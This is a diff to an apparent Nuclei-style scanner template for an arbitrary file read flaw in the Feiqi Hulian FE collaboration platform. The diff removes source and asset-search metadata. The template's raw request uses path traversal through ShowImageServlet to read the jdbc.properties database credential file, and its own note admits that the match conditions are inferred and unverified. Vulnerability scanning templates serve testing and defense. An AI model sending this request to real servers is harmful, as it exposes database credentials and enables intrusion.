@@ -3,14 +3,8 @@ info:
   name: 飞企互联FE业务协作平台ShowImageServlet接口任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e985b8e40fec559d4443b3c0087add97
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: e985b8e40fec559d4443b3c0087add97
-    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`
 http:
 - raw:
   - 'GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print HTTP/1.1
